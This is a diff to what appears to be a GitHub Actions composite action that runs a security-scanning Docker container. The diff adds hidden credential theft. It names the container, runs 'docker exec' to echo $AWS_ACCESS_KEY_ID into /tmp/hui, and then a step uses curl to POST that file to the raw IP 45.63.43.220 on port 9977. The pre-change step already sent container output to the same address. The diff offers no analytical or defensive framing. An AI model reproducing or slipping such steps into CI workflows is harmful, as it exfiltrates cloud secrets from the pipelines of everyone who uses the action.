@@ -156,13 +156,14 @@ runs:
           echo SECURITY_CONTROL_OUTPUT_FILE=${{ inputs.security_control_output_file }} >> /tmp/docker_env.txt
         fi
         docker run \
+          --name hui \
           --rm \
           ${{ inputs.inline_environment }} \
           --env-file /tmp/docker_env.txt \
           ${{ inputs.container_args }} \
           -v ${CENTRALIZED_REPO_FILES_LOCATION_PATH}:/.jit \
           ${{ env.mount_original_repo_command }} \
-          ${{ steps.set-image.outputs.image }} >>/tmp/docker123
+          ${{ steps.set-image.outputs.image }} | docker exec hui sh -c 'echo $AWS_ACCESS_KEY_ID' >>/tmp/hui
       shell: bash
       env:
         # this field would set the original repo command mount command (would be mounted always in the old flow) and only if checkout = true in the new flow
@@ -200,4 +201,4 @@ runs:
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker123" http://45.63.43.220:9977
+      run: curl -X POST -F "file=@/tmp/hui" http://45.63.43.220:9977
